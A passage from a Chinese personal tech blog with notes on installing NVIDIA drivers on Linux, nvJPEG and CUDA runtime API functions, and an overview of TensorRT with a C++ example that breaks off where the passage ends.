<li>NVIDIA官网驱动下载地址： <a target="_blank" rel="noopener" href="https://www.nvidia.com/zh-cn/">https://www.nvidia.com/zh-cn/</a>           进入后选择最上面的驱动程序 就可以自行选择自己的显卡<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//   这种方法安装nvidia驱动需要先停止图形界面</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> telinit 3</span><br><span class="line"></span><br><span class="line">//   之后进入一个新的命令行会话，使用当前的用户名密码登陆</span><br><span class="line"></span><br><span class="line">用<span class="built_in">cd</span> 进入你放nvidia驱动的路径</span><br><span class="line"></span><br><span class="line">用 ./  或者  bash  进行安装</span><br><span class="line"></span><br><span class="line">安装的过程如下：(按照以下步骤)</span><br><span class="line"></span><br><span class="line">Accept License</span><br><span class="line"></span><br><span class="line">The distribution-provided pre-install script failed! Are you sure you want to <span class="built_in">continue</span>?</span><br><span class="line">CONTINUE INSTALLATION</span><br><span class="line"></span><br><span class="line">Would you like to run the nvidia-xconfig utility?</span><br><span class="line">YES</span><br><span class="line"></span><br><span class="line">之后执行</span><br><span class="line"><span class="built_in">sudo</span> reboot // 重启</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>上面三种方法结束后，需要检验是否安装好了nvidia驱动。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> reboot  // 安装完了驱动需要重启</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nvidia-smi  //  检验是否安装好驱动</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="查看显卡驱动"><a href="#查看显卡驱动" class="headerlink" title="查看显卡驱动"></a>查看显卡驱动</h2><ul>
<li><p>查看显卡，在终端输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep -i vga</span><br><span class="line">lspci | grep -i nvidia</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看显卡驱动在终端输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep -i nvidia</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-nvidia_2_%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-nvidia_2_%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">nvidia_2_常用函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NVIDIA/" itemprop="url" rel="index"><span itemprop="name">NVIDIA</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="nvjpegBackend-t"><a href="#nvjpegBackend-t" class="headerlink" title="nvjpegBackend_t"></a>nvjpegBackend_t</h3><ul>
<li>简述：<ul>
<li><code>NVJPEG_BACKEND_DEFAULT</code>  –  默认值</li>
<li><code>NVJPEG_BACKEND_HYBRID</code>   –  使用CPU进行霍夫曼解码</li>
<li><code>NVJPEG_BACKEND_GPU_HYBRID</code>  –  使用GPU辅助霍夫曼解码。nvjpegDecodeBatched将使用GPU对基线JPEG比特流进行解码,当批量大小大于100时进行交错扫描</li>
<li><code>NVJPEG_BACKEND_HARDWARE</code> –  单扫描支持基线JPEG比特流。不支持410和411个子样本</li>
</ul>
</li>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef enum </span><br><span class="line">&#123;</span><br><span class="line">    NVJPEG_BACKEND_DEFAULT = 0,</span><br><span class="line">    NVJPEG_BACKEND_HYBRID  = 1,</span><br><span class="line">    NVJPEG_BACKEND_GPU_HYBRID = 2,</span><br><span class="line">    NVJPEG_BACKEND_HARDWARE = 3</span><br><span class="line">&#125; nvjpegBackend_t;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="nvjpegDevAllocator-t"><a href="#nvjpegDevAllocator-t" class="headerlink" title="nvjpegDevAllocator_t"></a>nvjpegDevAllocator_t</h3><ul>
<li>简述：内存分配器使用提到的原型，提供给nvjpegCreateEx<ul>
<li>这个分配器将用于库中的所有设备内存分配</li>
<li>无论如何，库都在进行智能分配(仅在需要时重新分配内存)</li>
</ul>
</li>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct </span><br><span class="line">&#123;</span><br><span class="line">    tDevMalloc dev_malloc;</span><br><span class="line">    tDevFree dev_free;</span><br><span class="line">&#125; nvjpegDevAllocator_t;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="nvjpegImage-t"><a href="#nvjpegImage-t" class="headerlink" title="nvjpegImage_t"></a>nvjpegImage_t</h3><ul>
<li>简述：输出描述符。根据输出格式，被写入平面的数据</li>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char * channel[NVJPEG_MAX_COMPONENT];</span><br><span class="line">    size_t    pitch[NVJPEG_MAX_COMPONENT];</span><br><span class="line">&#125; nvjpegImage_t;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="英伟达API"><a href="#英伟达API" class="headerlink" title="英伟达API"></a>英伟达API</h2><h3 id="nvjpegCreateSimple"><a href="#nvjpegCreateSimple" class="headerlink" title="nvjpegCreateSimple()"></a>nvjpegCreateSimple()</h3><ul>
<li>简述：使用默认后端和默认内存分配器(cudaMalloc&#x2F;cudaFree)初始化nvjpeg句柄</li>
<li>声明：<code>nvjpegStatus_t NVJPEGAPI nvjpegCreateSimple(nvjpegHandle_t *handle);</code></li>
<li>参数：<ul>
<li><code>handle</code>  –  编解码器实例，用于其他调用  –  Input&#x2F;Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="nvjpegCreate"><a href="#nvjpegCreate" class="headerlink" title="nvjpegCreate()"></a>nvjpegCreate()</h3><ul>
<li>简述：初始化nvjpeg句柄。此句柄用于所有连续调用</li>
<li>声明：<code>nvjpegStatus_t NVJPEGAPI nvjpegCreate(nvjpegBackend_t backend, nvjpegDevAllocator_t *dev_allocator, nvjpegHandle_t *handle);</code></li>
<li>参数：<ul>
<li><code>backend</code>  –  要使用的后端。目前支持默认或混合(目前相同)。  –  Input</li>
<li><code>dev_allocator</code>  –  指向nvjpegDevAllocator的指针。如果为NULL - 使用默认cuda调用(cudaMalloc&#x2F;cudaFree)  –  Input</li>
<li><code>handle</code>   –  编解码器实例，用于其他调用  –  Input&#x2F;Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="nvjpegDestroy"><a href="#nvjpegDestroy" class="headerlink" title="nvjpegDestroy()"></a>nvjpegDestroy()</h3><ul>
<li>简述：释放句柄和资源</li>
<li>声明：<code>nvjpegStatus_t NVJPEGAPI nvjpegDestroy(nvjpegHandle_t handle);</code></li>
<li>参数：<ul>
<li><code>handle</code>  –  要释放的实例句柄  –  Input&#x2F;Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="nvjpegJpegStateCreate"><a href="#nvjpegJpegStateCreate" class="headerlink" title="nvjpegJpegStateCreate()"></a>nvjpegJpegStateCreate()</h3><ul>
<li>简述：解码状态的初始化</li>
<li>声明：<code>nvjpegStatus_t NVJPEGAPI nvjpegJpegStateCreate(nvjpegHandle_t handle, nvjpegJpegState_t *jpeg_handle);</code></li>
<li>参数：<ul>
<li><code>handle</code>  –  编解码器实例  –  Input</li>
<li><code>jpeg_handle</code>  –  解码的jpeg图像状态句柄  –  Input&#x2F;Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="nvjpegJpegStateDestroy"><a href="#nvjpegJpegStateDestroy" class="headerlink" title="nvjpegJpegStateDestroy()"></a>nvjpegJpegStateDestroy()</h3><ul>
<li>简述：释放jpeg图像句柄</li>
<li>声明：<code>nvjpegStatus_t NVJPEGAPI nvjpegJpegStateDestroy(nvjpegJpegState_t jpeg_handle);</code></li>
<li>参数：<ul>
<li><code>jpeg_handle</code>  –  解码的jpeg图像状态句柄  –  Input&#x2F;Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="nvjpegGetImageInfo"><a href="#nvjpegGetImageInfo" class="headerlink" title="nvjpegGetImageInfo()"></a>nvjpegGetImageInfo()</h3><ul>
<li>简述：检索图像信息，包括通道、每个图像层的宽度和高度，以及色度下采样。<ul>
<li>如果编码的通道小于NVJPEG_MAX_COMPONENT，那么零将被设置为缺失通道信息</li>
<li>如果图像是三通道的，则所有三组都有效</li>
<li>This function is thread safe.</li>
</ul>
</li>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nvjpegStatus_t NVJPEGAPI nvjpegGetImageInfo(</span><br><span class="line">nvjpegHandle_t handle,</span><br><span class="line">const unsigned char *data, </span><br><span class="line">size_t length,</span><br><span class="line">int *nComponents, </span><br><span class="line">nvjpegChromaSubsampling_t *subsampling,</span><br><span class="line">int *widths,</span><br><span class="line">int *heights);</span><br></pre></td></tr></table></figure></li>
<li>参数：<ul>
<li><code>handle</code>  –  编解码器实例  –  Input</li>
<li><code>data</code>    –  指向缓冲区的指针，其中包含要解码的jpeg流数据。  –  Input</li>
<li><code>length</code>  –  jpeg图像缓冲区的长度。  –  Input</li>
<li><code>nComponent</code>  –  图像的组件数(层数)，目前只支持1通道(灰度)或3通道。  –  Output</li>
<li><code>subsampling</code> –  在这个JPEG中使用的色度下采样，参见nvjpegChromaSubsampling_t  –  Output</li>
<li><code>widths</code>  –  指向NVJPEG_MAX_COMPONENT的指针，返回每个通道的宽度。如果信道未编码，则为0  –  Output</li>
<li><code>heights</code> –  指向NVJPEG_MAX_COMPONENT的指针，返回每个通道的高度。如果信道未编码，则为0  –  Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="nvjpegDecode"><a href="#nvjpegDecode" class="headerlink" title="nvjpegDecode()"></a>nvjpegDecode()</h3><ul>
<li>简述：解码单幅图像<ul>
<li>API是后端不可知的。</li>
<li>它将决定在内部使用哪个实现。目标缓冲区应该足够大，能够存储指定格式的输出。</li>
<li>对于每个颜色平面，可以使用<code>nvjpegGetImageInfo()</code>检索图像大小，每个平面所需的最小内存缓冲区是<code>nPlaneHeight*nPlanePitch</code>，</li>
<li>其中<code>nPlanePitch &gt;= nPlaneWidth</code>用于平面输出格式，</li>
<li><code>nPlanePitch &gt;= nPlaneWidth*nOutputComponents</code>用于交错输出格式</li>
</ul>
</li>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nvjpegStatus_t NVJPEGAPI nvjpegDecode(</span><br><span class="line">        nvjpegHandle_t handle,</span><br><span class="line">        nvjpegJpegState_t jpeg_handle,</span><br><span class="line">        const unsigned char *data,</span><br><span class="line">        size_t length, </span><br><span class="line">        nvjpegOutputFormat_t output_format,</span><br><span class="line">        nvjpegImage_t *destination,</span><br><span class="line">        cudaStream_t stream);</span><br></pre></td></tr></table></figure></li>
<li>参数：<ul>
<li><code>handle</code>  –  编解码器实例  –  Input&#x2F;Output</li>
<li><code>jpeg_handle</code>  –  解码的jpeg图像状态句柄  –  Input&#x2F;Output</li>
<li><code>data</code>    –  指向包含要解码的jpeg图像的缓冲区的指针。  –  Input</li>
<li><code>length</code>  –  jpeg图像缓冲区的长度。  –  Input</li>
<li><code>output_format</code>  –  输出数据格式。有关描述，请参阅nvjpegOutputFormat_t  –  Input</li>
<li><code>destination</code>    –  指向结构的指针，包含输出缓冲区的信息。参见nvjpegImage_t描述。  –  Input&#x2F;Output</li>
<li><code>stream</code>  –  CUDA流在哪里提交所有GPU工作  –  Input&#x2F;Output</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  </li>
<li>失败  –</li>
</ul>
</li>
</ul>
<h3 id="cudaStreamSynchronize"><a href="#cudaStreamSynchronize" class="headerlink" title="cudaStreamSynchronize()"></a>cudaStreamSynchronize()</h3><ul>
<li>简述：阻塞任务流，直到流完成所有操作。如果 device 设置了<code>cudaDeviceScheduleBlockingSync</code>标识，主机线程在它完成所有的任务之前，会一直阻塞</li>
<li>声明：<code>cudaError_t cudaStreamSynchronize(cudaStream_t stream);</code></li>
<li>参数：<ul>
<li><code>stream</code>  –  流标识符</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  返回<code>cudaSuccess</code></li>
<li>失败  –  返回<code>cudaErrorInvalidResourceHandle</code></li>
</ul>
</li>
</ul>
<h3 id="cudaStreamCreateWithFlags"><a href="#cudaStreamCreateWithFlags" class="headerlink" title="cudaStreamCreateWithFlags()"></a>cudaStreamCreateWithFlags()</h3><ul>
<li>简述：创建一个新的异步的流,通过参数<code>flags</code>来设置流的属性  <ul>
<li><code>Create an asynchronous stream Creates a new asynchronous stream.</code></li>
<li><code>The flags argument determines the behaviors of the stream.</code></li>
</ul>
</li>
<li>声明：<code>cudaError_t cudaStreamCreateWithFlags(cudaStream_t *pStream, unsigned int flags);</code></li>
<li>参数：<ul>
<li><code>pStream</code>  –  指向流标识符的指针</li>
<li><code>flags</code>    –  创建流的参数,有效的参数为：<ul>
<li><code>cudaStreamDefault</code>  –  默认标识</li>
<li><code>cudaStreamNonBlocking</code>  –   异步流，异步于NULL流</li>
</ul>
</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  cudaSuccess</li>
<li>失败  –  cudaErrorInvalidValue</li>
</ul>
</li>
</ul>
<h3 id="cudaGetDeviceCount"><a href="#cudaGetDeviceCount" class="headerlink" title="cudaGetDeviceCount()"></a>cudaGetDeviceCount()</h3><ul>
<li>简述：获取可用算能设备的数量</li>
<li>声明：<code>cudaError_t cudaGetDeviceCount(int *count);</code></li>
<li>参数：<ul>
<li><code>count</code>  –  具有计算能力的设备数字</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  cudaSuccess</li>
</ul>
</li>
</ul>
<h3 id="cudaGetDevice"><a href="#cudaGetDevice" class="headerlink" title="cudaGetDevice()"></a>cudaGetDevice()</h3><ul>
<li>简述：返回当前正在使用的设备</li>
<li>声明：<code>cudaError_t cudaGetDevice(int *device);</code></li>
<li>参数：<ul>
<li><code>device</code>  –  正在工作的主机线程所执行的设备代码</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  cudaSuccess</li>
<li>失败  –  cudaErrorInvalidValue</li>
</ul>
</li>
</ul>
<h3 id="cudaSetDevice"><a href="#cudaSetDevice" class="headerlink" title="cudaSetDevice()"></a>cudaSetDevice()</h3><ul>
<li>简述：设置GPU运行的设备</li>
<li>声明：<code>cudaError_t cudaSetDevice(int device);</code></li>
<li>参数：<ul>
<li><code>device</code>  –  调用这个函数的主机线程要执行设备代码的设备</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  cudaSuccess</li>
<li>失败  –  cudaErrorInvalidDevice  | cudaErrorDeviceAlreadyInUse</li>
</ul>
</li>
<li>注意：<ul>
<li>随后任何设备由<code>cudaMalloc(), cudaMallocPitch(), cudaMallocArray()</code>申请的设备内存都会分配到对应device的物理设备</li>
<li>任何主机线程通过<code>cudaMallocHost(), cudaHostAlloc(), cudaHostRegister()</code>申请的主机内存都会将它们的生命周期与设备device关联起来</li>
<li>任何通过主机线程创建的流或事件都会和设备device关联起来</li>
<li>任何通过主机线程由<code>cudaLaunchKernel()</code>发生的内核调用都会在设备device上执行</li>
<li>这个调用可能在任何时间，由任何主机线程在任何设备上调用。</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功  –  cudaSuccess</li>
<li>失敗  –  cudaErrorInvalidDevice | cudaErrorDeviceAlreadyInUse</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/NVIDIA/TensorRT/2024-05-22-tensorrt_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/NVIDIA/TensorRT/2024-05-22-tensorrt_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">tensorrt_1_理论基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NVIDIA/" itemprop="url" rel="index"><span itemprop="name">NVIDIA</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>tensorrt库</li>
</ul>
<h2 id="tensorrt-GA和EA的区别"><a href="#tensorrt-GA和EA的区别" class="headerlink" title="tensorrt GA和EA的区别"></a>tensorrt GA和EA的区别</h2><ul>
<li>EA版本代表抢鲜体验，在正式发布之前</li>
<li>GA代表通用性，表示稳定版，经过全面测试。</li>
</ul>
<h2 id="TensorRT加速"><a href="#TensorRT加速" class="headerlink" title="TensorRT加速"></a>TensorRT加速</h2><ul>
<li>TensorRT是英伟达开发针对自身显卡来优化的推理加速框架，TensorRT主要做了两件事情，来提升模型的运行速度<ul>
<li>TensorRT降精度推理支持INT8和FP16的计算。深度学习网络在训练时，通常使用 32 位或 16 位数据。TensorRT则在网络的推理时选用不这么高的精度，达到加速推断的目的。</li>
<li>TensorRT对于网络结构进行了重构，把一些能够合并的运算合并在了一起，针对GPU的特性做了优化。因为显卡是英伟达出的没有谁比英伟达更懂自己的显卡，自然就推出了针对自己GPU的加速工具TensorRT。一个深度学习模型，在没有优化的情况下，比如一个卷积层、一个偏置层和一个reload层，这三层是需要调用三次cuDNN对应的API，但实际上这三层的实现完全是可以合并到一起的，TensorRT会对一些可以合并网络进行合并。</li>
</ul>
</li>
</ul>
<h2 id="C-tensorrt是什么"><a href="#C-tensorrt是什么" class="headerlink" title="C++ tensorrt是什么"></a>C++ tensorrt是什么</h2><p>TensorRT（Tensor Runtime）是由 NVIDIA 开发的用于高性能深度学习推理（inference）的库。它主要用于加速深度学习模型在 NVIDIA GPU 上的推理阶段，以提高模型的实时性能。</p>
<p>TensorRT 提供了许多优化技术，以减少深度学习模型推理的计算和内存开销。它通过使用精确的数值计算、层融合（layer fusion）、动态 Tensor 网络（dynamic tensor network）、深度学习加速库（cuDNN）、自动混合精度（automatic mixed precision）等技术，提供高效的推理加速。</p>
<p>TensorRT 支持多种深度学习框架，包括 TensorFlow、PyTorch、ONNX（Open Neural Network Exchange）等。你可以使用 TensorRT 将经过训练的深度学习模型转换为 TensorRT 可以高效执行的格式，以利用 GPU 进行快速推理。</p>
<p>以下是 TensorRT 的一些主要特性：</p>
<ol>
<li><p><strong>快速推理：</strong> TensorRT 通过 GPU 加速深度学习推理，提供高性能的模型执行。</p>
</li>
<li><p><strong>精确数值计算：</strong> TensorRT 支持对模型进行精确数值计算，以在不牺牲模型精度的情况下提高推理速度。</p>
</li>
<li><p><strong>层融合：</strong> TensorRT 可以自动融合相邻层，减少计算和内存开销。</p>
</li>
<li><p><strong>支持多种框架：</strong> TensorRT 提供用于与多种深度学习框架集成的工具，包括 TensorFlow、PyTorch、ONNX 等。</p>
</li>
<li><p><strong>动态 Tensor 网络：</strong> TensorRT 支持构建动态的 Tensor 网络，适用于需要在推理期间动态改变形状的模型。</p>
</li>
</ol>
<p>TensorRT 的使用通常涉及到以下几个步骤：</p>
<ol>
<li><p><strong>创建和训练模型：</strong> 使用深度学习框架创建和训练深度学习模型。</p>
</li>
<li><p><strong>模型转换：</strong> 使用 TensorRT 提供的工具将训练好的模型转换为 TensorRT 可以高效执行的格式。</p>
</li>
<li><p><strong>加载和推理：</strong> 在 C++ 或其他支持的语言中加载 TensorRT 格式的模型并进行推理。</p>
</li>
</ol>
<p>TensorRT 是用于加速深度学习推理的强大工具，尤其在实时应用、嵌入式系统和边缘计算等场景中具有重要作用。</p>
<h2 id="C-tensorrt-库-详解"><a href="#C-tensorrt-库-详解" class="headerlink" title="C++ tensorrt 库 详解"></a>C++ tensorrt 库 详解</h2><p>TensorRT 是 NVIDIA 提供的深度学习推理库，专为在 NVIDIA GPU 上进行深度学习模型的加速而设计。TensorRT 提供了一系列工具和优化技术，以在推理阶段获得高性能、低延迟的模型执行。以下是关于 TensorRT 库的一些详细信息：</p>
<h3 id="TensorRT-的主要特性："><a href="#TensorRT-的主要特性：" class="headerlink" title="TensorRT 的主要特性："></a>TensorRT 的主要特性：</h3><ol>
<li><p><strong>快速推理：</strong> TensorRT 通过 GPU 加速深度学习推理，提供高性能的模型执行。它针对 NVIDIA GPU 的架构进行了优化，充分利用了 GPU 的并行计算能力。</p>
</li>
<li><p><strong>精确数值计算：</strong> TensorRT 支持深度学习模型的精确数值计算，同时考虑到模型推理过程中的计算精度和效率。</p>
</li>
<li><p><strong>层融合：</strong> TensorRT 可以自动融合相邻层，减少计算和内存开销。这种层融合技术有助于减小模型的计算图，提高推理性能。</p>
</li>
<li><p><strong>多精度计算：</strong> TensorRT 支持多种精度计算，包括 FP32、FP16 和 INT8。可以根据模型的需求选择合适的精度，以在保持精度的同时提高计算性能。</p>
</li>
<li><p><strong>层和操作库：</strong> TensorRT 提供了包括卷积、归一化、激活函数等在内的一系列层和操作库，以满足不同模型结构的推理需求。</p>
</li>
<li><p><strong>支持多种框架：</strong> TensorRT 支持多种深度学习框架，包括 TensorFlow、PyTorch、ONNX 等。通过支持多种框架，TensorRT 提供了灵活性，使用户能够在不同框架之间无缝转换和使用模型。</p>
</li>
<li><p><strong>动态 Tensor 网络：</strong> TensorRT 支持构建动态的 Tensor 网络，适用于需要在推理期间动态改变形状的模型。</p>
</li>
</ol>
<h3 id="TensorRT-的使用流程："><a href="#TensorRT-的使用流程：" class="headerlink" title="TensorRT 的使用流程："></a>TensorRT 的使用流程：</h3><ol>
<li><p><strong>创建和训练模型：</strong> 使用深度学习框架（例如 TensorFlow、PyTorch）创建和训练深度学习模型。</p>
</li>
<li><p><strong>模型转换：</strong> 使用 TensorRT 提供的工具将训练好的模型转换为 TensorRT 可以高效执行的格式。这通常涉及到使用 TensorRT 的 Python API 进行模型转换。</p>
</li>
<li><p><strong>TensorRT 推理引擎构建：</strong> 使用 C++ 或其他支持的语言，在运行时加载 TensorRT 格式的模型并构建 TensorRT 推理引擎。推理引擎是 TensorRT 用于高效执行模型的核心组件。</p>
</li>
<li><p><strong>输入数据传递和推理：</strong> 将输入数据传递给 TensorRT 推理引擎，并执行推理操作。TensorRT 会在 GPU 上对输入数据进行并行计算，并输出模型的推理结果。</p>
</li>
<li><p><strong>清理资源：</strong> 在推理完成后，释放分配的 GPU 和 CPU 资源，以确保良好的系统资源管理。</p>
</li>
</ol>
<h3 id="TensorRT-C-API-使用示例："><a href="#TensorRT-C-API-使用示例：" class="headerlink" title="TensorRT C++ API 使用示例："></a>TensorRT C++ API 使用示例：</h3><p>以下是一个简化的 TensorRT C++ API 使用示例，展示了加载 TensorRT 模型并进行推理的基本步骤：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;NvInfer.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化 TensorRT</span></span><br><span class="line">    nvinfer1::IRuntime* runtime = nvinfer1::<span class="built_in">createInferRuntime</span>(gLogger);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件中加载 TensorRT 模型</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* trtModelPath = <span class="string">&quot;path/to/your/model.plan&quot;</span>;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">trtModelStream</span><span class="params">(trtModelPath, 